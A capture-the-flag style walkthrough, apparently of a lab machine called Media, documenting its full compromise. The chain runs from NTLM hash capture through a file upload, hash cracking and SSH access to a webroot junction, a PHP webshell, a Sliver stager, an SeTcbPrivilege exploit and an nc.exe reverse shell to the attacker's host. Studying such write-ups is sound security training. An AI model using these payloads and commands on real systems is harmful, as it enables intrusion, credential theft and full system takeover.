```python
 rustscan -a 10.129.60.79  --ulimit 5000 -- -A -T4 -oA nmap_sca
```

```python

PORT   STATE SERVICE REASON          VERSION
22/tcp open  ssh     syn-ack ttl 127 OpenSSH for_Windows_9.5 (protocol 2.0)
80/tcp open  http    syn-ack ttl 127 Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
|_http-title: ProMotion Studio

```

- we found that port `80` was open and going through the website, we found an upload form.
![[Pasted image 20260910210032.png]]

- Tried to do an `ntlm relay` attack using the `ntlm_theft.py` tool
```python
python3 ntlm_theft.py --generate all --server 10.10.17.184 --filename shell
```

**uploaded the `.asx` version after starting Responder on my machiene..

```python
[SMB] NTLMv2-SSP Client   : 10.129.60.79
[SMB] NTLMv2-SSP Username : MEDIA\enox
[SMB] NTLMv2-SSP Hash     : enox::MEDIA:88bf3f744186ad36:DA58F61BB5D9F89473A046454FF33CCA:
```

- we got the `NTLM` hash, lets try to crack it using hashcat

- Cracked it : 
- creds for the user ENOX
```python
ENOX : 1234virus@
```
- Tried to login with `ssh`.. Boom! we have foothold on the target.!
- Next we try to find the source code of the php website
- using our research we determined that it'll be present in this folder :
```python
C:\xampp\htdocs
```

- saw `index.php` there, opened it and got to know that the `uploads` directory path
```python
S C:\xampp\htdocs> type .\index.php
<?php
error_reporting(0);

    // Your PHP code for handling form submission and file upload goes here.
    $uploadDir = 'C:/Windows/Tasks/Uploads/'; // Base upload directory

```

- we also observed the logic to create individual user folders based on their firstname, lastname and email :
```python

        // Create a folder name using the MD5 hash of Firstname + Lastname + Email
        $folderName = md5($firstname . $lastname . $email);

        // Create the full upload directory path
        $targetDir = $uploadDir . $folderName . '/';

        // Ensure the directory exists; create it if not
        if (!file_exists($targetDir)) {
            mkdir($targetDir, 0777, true);
        }
```

- So we can predict the folder names
- the uploaded file is saved under : `C:\Windows\Tasks\Uploads\<md5(firstname + lastname + email)>\`

Example MD5 calculation:
`echo -n "[FIRSTNAME][LASTNAME][EMAIL]" | md5sum`

## Upload Directory Permissions
**The upload directory was inspected:**
`cd C:\Windows\Tasks\Uploads`

**Permissions were checked with PowerShell:**

`Get-Acl -Path "C:\Windows\Tasks\Uploads\<MD5_FOLDER>"`

```python
PS C:\Windows\Tasks\Uploads> Get-acl -Path "C:\Windows\Tasks\Uploads\d41d8cd98f00b204e9800998ecf8427e"


    Directory: C:\Windows\Tasks\Uploads


Path                             Owner                      Access
----                             -----                      ------
d41d8cd98f00b204e9800998ecf8427e NT AUTHORITY\LOCAL SERVICE Everyone Allow  FullContr...


PS C:\Windows\Tasks\Uploads>
```

The upload subfolder was owned by `NT AUTHORITY\LOCAL SERVICE`, and the ACL allowed broad modification rights. This meant the predictable MD5 upload subfolder could be moved or removed and replaced with a filesystem link.

```python
Move-Item -Path "C:\Windows\Tasks\Uploads\d41d8cd98f00b204e9800998ecf8427e" -Destination "C:\Temp"
```
- This will move the `md5` folder to `C:\Temp`

- Then lets create a `directory junction` at the same path pointing to the `Apache web root`
```python
New-Item -ItemType Junction -Path "C:\Windows\Tasks\Uploads\d41d8cd98f00b204e9800998ecf8427e" -Target "C:\xampp\htdocs"
```
- basically this points to the webroot directory so that when we upload stuff to the php website, instead of it getting downloaded to the current dir `C:\Windows\Tasks\Uploads` , it gets uploaded to our webroot directory .
- see : 
```python
PS C:\Windows\Tasks\Uploads> cd .\d41d8cd98f00b204e9800998ecf8427e\
PS C:\Windows\Tasks\Uploads\d41d8cd98f00b204e9800998ecf8427e> ls


    Directory: C:\Windows\Tasks\Uploads\d41d8cd98f00b204e9800998ecf8427e


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         10/2/2023  10:27 AM                assets
d-----         10/2/2023  10:27 AM                css
d-----         10/2/2023  10:27 AM                js
-a----        10/10/2023   5:00 AM          20563 index.php
#its showing the contents of our webroot
```
- lets now upload a php webshell to try and get access :
```php
<?php system($_GET['cmd']); ?>
#saved it as shell.php and lets try and access it from the website :)
```
![[Pasted image 20260912103117.png]]
- so we confirmed accesss as `nt authority\local service`
- lets upload a reverse shell to gain proper interactive access.
- lets use sliver to create a stager which downloads the shell code and gives us a reverse shell
- created the payload with sliver and uploaded the stager. Refer to [[DarkHaven WT]] for additional details on using sliver.
- then we triggered the stager by : `http://10.129.61.17/shell.php?cmd=.\stager.exe`

- we have a stable shell as `nt AUTHORITY\LOCAL SERVICE`
![[Pasted image 20260912104841.png]]

```python
[127.0.0.1] sliver (NICE_COMPOSITION) > getprivs

[*] Session bc9695f7 has been updated - Sat, 12 Sep 2026 10:53:23 IST
Privilege Information for stager.exe (PID: 1056)
------------------------------------------------

Process Integrity Level: High

Name                          	Description                         	Attributes
====                          	===========                         	==========
SeTcbPrivilege                	Act as part of the operating system 	Disabled
SeChangeNotifyPrivilege       	Bypass traverse checking            	Enabled, Enabled by Default
SeCreateGlobalPrivilege       	Create global objects               	Enabled, Enabled by Default
SeIncreaseWorkingSetPrivilege 	Increase a process working set      	Disabled
SeTimeZonePrivilege           	Change the time zone                	Disabled

[127.0.0.1] sliver (NICE_COMPOSITION) >
```
- we have the above privileges as the current user
- used this script to enable all privileges : [script](https://github.com/fashionproof/EnableAllTokenPrivs/blob/master/EnableAllTokenPrivs.ps1)
![[Pasted image 20260912110404.png]]

- As per my reasearch `SeTcbPrivilege` is the most beneficial privilege for us to escalate our privileges to `SYSTEM`
- did some research and found a POC to exploit it, lets try: [poc link](https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178)
- compile it
```python
x86_64-w64-mingw32-g++ -o TcbElevation.exe TcbElevation.cpp -static -ladvapi32 -lsecur32 -lkernel32 -DUNICODE -D_UNICODE -municode
```

**Execution**
```python
.\TcbElevation.exe revshell101 "cmd.exe /c C:\xampp\htdocs\nc.exe 10.10.17.184 8002 -e powershell.exe"
```
- lets make sure to upload `nc.exe` also
![[Pasted image 20260912111453.png]]
- we are `SYSTEM`
- PWNED Media!

Pwned Media 

NTLM relay → cracked creds → SSH foothold → PHP upload abuse → junction to webroot → Local Service → SeTcbPrivilege abuse → SYSTEM.